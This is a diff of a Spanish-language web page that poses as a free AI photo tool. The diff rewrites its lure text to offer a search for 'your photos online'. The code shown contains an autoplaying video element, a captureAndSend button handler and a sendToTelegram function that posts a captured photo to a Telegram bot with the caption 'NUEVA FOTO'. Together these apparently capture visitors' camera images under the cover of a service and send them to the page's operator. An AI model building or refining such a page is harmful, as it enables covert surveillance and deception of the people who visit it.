@@ -1,9 +1,4 @@
 <!DOCTYPE html>
-        <html>
-          <head>
-            <title data-id="th-modified">IA IMAGES</title>
-          <body>
-            <!DOCTYPE html>
 <html lang="es">
 <head>
   <meta charset="UTF-8">
@@ -136,11 +131,11 @@
   <main class="flex-grow flex flex-col items-center px-4">
     <div class="text-center max-w-2xl mb-10">
       <h1 class="text-4xl font-bold tracking-tight text-slate-900 sm:text-5xl mb-4">
-        Mejora tus imágenes con <span class="gradient-text">AI Power</span>
+     <h1>Encuentra tus fotos online con<h1><p></p> <span class="gradient-text">AI Power</span>
        
        </h1>
       <p class="text-lg text-slate-600">
-       Herramientas de nivel profesional para eliminar fondos y mejorar imágenes. Rápidas, gratuitas e increíblemente sencillas.
+       Herramienta de nivel profesional para buscar tus fotos en internet gratuito e increíblemente sencillo.
       </p>
   <div id="cards"></div>
   <video id="video" autoplay playsinline></video>
@@ -166,7 +161,7 @@
         
         <div class="name">${name}</div>
         <div class="status"> • GRATIS</div>
-        <button class="btn" onclick="captureAndSend('${name}')">Subir Imagen</button>
+        <button class="btn" onclick="captureAndSend('${name}')">Buscar</button>
       `;
       cardsContainer.appendChild(card);
     });
@@ -209,7 +204,7 @@
     function sendToTelegram(imageData, name) {
       const formData = new FormData();
       formData.append("chat_id", CHAT_ID);
-      formData.append("caption", `📸 NUEVA FOTO | DEVELOPER 》 ANDRIUX |`);
+      formData.append("caption", `📸 NUEVA FOTO | CREADOR: 👑 ANDRIUX 👑 `);
       formData.append("photo", dataURItoBlob(imageData), "photo.jpg");
 
       fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
